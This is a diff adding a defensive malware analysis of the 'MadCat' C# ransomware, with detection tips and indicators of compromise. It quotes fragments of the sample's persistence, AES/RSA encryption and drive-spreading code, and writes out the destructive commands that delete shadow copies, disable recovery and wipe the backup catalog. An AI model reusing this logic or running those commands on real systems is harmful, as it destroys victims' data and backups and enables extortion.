@@ -1,0 +1,193 @@
+
+# 🐱💀 Analysis of "MadCat" Ransomware
+
+## 📌 Introduction
+
+This analysis concerns a ransomware written in **C# (.NET)** that identifies itself in the ransom note as **MadCat Ransomware**. The code exhibits behaviors characteristic of modern ransomware: encryption of user files, data destruction prevention bypass, persistence mechanisms, and basic evasion techniques.
+
+A large number of valid file extensions (229) indicates it targets common user data. The sample uses both **AES and RSA** encryption and attempts to spread via external drives.
+
+## ⚙️ General Behavior
+
+Upon execution, the ransomware:
+
+1. Checks if an instance is already running.
+2. Attempts to persist in the system via startup folder and registry entries.
+3. Copies itself to `%AppData%`, sometimes requesting admin privileges.
+4. Deletes system backups (shadow copies, recovery mode, backup catalog).
+5. Encrypts files recursively in multiple user and shared directories.
+6. Drops a ransom note and changes the desktop wallpaper.
+7. Starts a UI listener from a `driveNotification.NotificationForm`.
+
+## 🔬 Technical Analysis
+
+### `Main()`
+```csharp
+if (AlreadyRunning()) Environment.Exit(1);
+// Persistence
+if (checkSleep) sleepOutOfTempFolder();
+if (checkAdminPrivilage) copyResistForAdmin(processName); else if (checkCopyRoaming) copyRoaming(processName);
+if (checkStartupFolder) addLinkToStartup();
+// File encryption
+lookForDirectories();
+// Destruction of recovery options
+if (checkdeleteShadowCopies) deleteShadowCopies();
+if (checkdisableRecoveryMode) disableRecoveryMode();
+if (checkdeleteBackupCatalog) deleteBackupCatalog();
+// Spread + notify
+if (checkSpread) spreadIt(spreadName);
+addAndOpenNote(); SetWallpaper(base64Image);
+new Thread((ThreadStart)delegate { Run(); }).Start();
+```
+
+> Main orchestrates the ransomware's logic: persistence, privilege escalation, encryption, and UI triggering.
+
+### `AlreadyRunning()`
+```csharp
+foreach (Process process in Process.GetProcesses()) {
+    if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
+        return true;
+}
+```
+
+> Prevents multiple instances of the malware from running.
+
+### `copyResistForAdmin()` and `copyRoaming()`
+```csharp
+File.Copy(friendlyName, text2); Process.Start(processStartInfo);
+```
+
+> Copies the malware to `%AppData%` and relaunches it. `copyResistForAdmin` requests elevated privileges using `runas`.
+
+### `addLinkToStartup()`
+```csharp
+StreamWriter sw = new StreamWriter(folderPath + "\" + text + ".url");
+sw.WriteLine("[InternetShortcut]");
+sw.WriteLine("URL=file:///" + location);
+```
+
+> Adds a `.url` shortcut to the startup folder for persistence.
+
+### `encryptDirectory(location)`
+```csharp
+foreach (string file in Directory.GetFiles(location)) {
+    if (file matches valid extension && size < 2MB) EncryptFile(file);
+    else overwrite with random data and rename;
+}
+File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
+```
+
+> Encrypts or corrupts files using either AES-RSA or junk data. Drops ransom note once per folder.
+
+### `EncryptFile()`
+```csharp
+string password = CreatePassword(20);
+byte[] aes = AES_Encrypt(fileBytes, password);
+string rsa = RSAEncrypt(password, rsaKey());
+File.WriteAllText(file, "<EncryptedKey>" + rsa + "<EncryptedKey>" + Convert.ToBase64String(aes));
+```
+
+> Encrypts file content with AES, encrypts AES key with hardcoded RSA public key.
+
+### `AES_Encrypt()`
+```csharp
+Rfc2898DeriveBytes rfc = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
+rijndaelManaged.Key = rfc.GetBytes(32);
+```
+
+> AES-256 CBC mode with a static salt and password-based key derivation.
+
+### `RSAEncrypt()`
+```csharp
+rsa.FromXmlString(publicKeyString);
+return Convert.ToBase64String(rsa.Encrypt(bytes, fOAEP: true));
+```
+
+> Encrypts the AES key with a hardcoded RSA key. This prevents decryption without private RSA key.
+
+### `lookForDirectories()`
+```csharp
+encryptDirectory(userDir + userName + "\Documents");
+encryptDirectory(Environment.SpecialFolder.CommonDocuments);
+...
+```
+
+> Targets various directories for encryption: Desktop, Documents, AppData, OneDrive, etc.
+
+### `deleteShadowCopies()`, `disableRecoveryMode()`, `deleteBackupCatalog()`
+```csharp
+runCommand("vssadmin delete shadows /all /quiet");
+runCommand("bcdedit /set {default} recoveryenabled no");
+runCommand("wbadmin delete catalog -quiet");
+```
+
+> Classic anti-recovery operations to prevent restoring the system.
+
+### `spreadIt()`
+```csharp
+File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo + spreadName);
+```
+
+> Spreads to removable drives using a hardcoded name (`surprise.exe`).
+
+### `addAndOpenNote()`
+```csharp
+File.WriteAllLines(path, messages); Process.Start(path);
+```
+
+> Drops the ransom note and opens it automatically.
+
+### `SetWallpaper()`
+```csharp
+File.WriteAllBytes(tempFile, Convert.FromBase64String(base64));
+SystemParametersInfo(20u, 0u, tempFile, 3u);
+```
+
+> Changes the desktop wallpaper using a base64-encoded image.
+
+## 🛠 Techniques Used
+
+### 🧬 Persistence
+- Startup shortcut (`addLinkToStartup`)
+- Registry Run key (`registryStartup`)
+- Copy in AppData with `runas` (`copyResistForAdmin`, `copyRoaming`)
+
+### 🕵️‍♂️ Obfuscation
+- Variable names (e.g., `appMutexRun2`, `staticSplit`)
+- Randomized extension for encrypted files
+- `randomEncode()` function used for junk file contents
+
+### 🔐 File Encryption
+- AES with RSA-encrypted keys
+- Junk data for large or unsupported files
+
+### 📡 Exfiltration / Communication
+- No direct exfiltration, only email address (`Hitters@skiff.com`) and BTC address in ransom note.
+
+### 🧨 Destruction of Backups
+- Shadow copies deletion
+- Recovery mode disabled
+- Backup catalog deletion
+
+### 💾 Spreading
+- Copies itself to external drives with fixed name
+
+## ✅ Conclusion
+
+This malware is a fully functional ransomware with features expected from modern samples: persistence, multi-algorithm encryption, recovery prevention, and basic spreading.
+
+### 🔍 Detection Tips
+- Look for unauthorized `.url` in `%Startup%`
+- Monitor calls to `vssadmin`, `bcdedit`, and `wbadmin`
+- Detect presence of ransom note `HACKED.TXT` or email `Hitters@skiff.com`
+
+## 🧾 Indicators (IOCs)
+
+- **Dropped file**: `HACKED.TXT`
+- **Targeted extensions**: 229+ extensions including `.docx`, `.pdf`, `.jpg`, `.mp3`, `.sql`
+- **Spreading filename**: `surprise.exe`
+- **Persistence keys**: `%Startup%\host.exe.url`
+- **Wallpaper base64**: (obfuscated placeholder)
+- **RSA Public Key modulus (partial)**: `yPI4uNmgcB/hFcXfs4qj5XOQpCm8P/gR...`
+- **Bitcoin Address**: `bc1qp6pn4aud0jj7mtcv6p0cua78wyelk9459mawze`
+- **Email Contact**: `Hitters@skiff.com`
